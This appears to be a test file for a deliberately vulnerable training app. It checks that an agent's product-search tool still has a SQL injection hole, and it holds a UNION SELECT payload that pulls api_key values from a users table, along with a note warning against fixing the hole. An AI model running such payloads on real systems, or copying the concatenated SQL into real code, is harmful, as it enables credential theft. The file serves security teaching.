const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { seedShop, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability sqli-union
 * @teaches OWASP-Web:A03
 * @location agent-host/agents/product-search/tools/search.js:42
 * DO NOT "FIX" THIS. If this test fails, the SQL concat was removed.
 */
test('sqli-union: product-search.search leaks api_key column', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { search } = require(path.join(REPO, 'agent-host/agents/product-search/tools/search.js'));
    const injection = `zzz%' UNION SELECT NULL,api_key,NULL,NULL,NULL,NULL,NULL,NULL,'active',NULL,NULL FROM shop_users --`;
    const r = await search({ query: injection });
    const dump = JSON.stringify(r);
    assert.match(dump, /sk_ss_sasan_secret_key_deadbeef/);
  } finally {
    await s.close();
  }
});
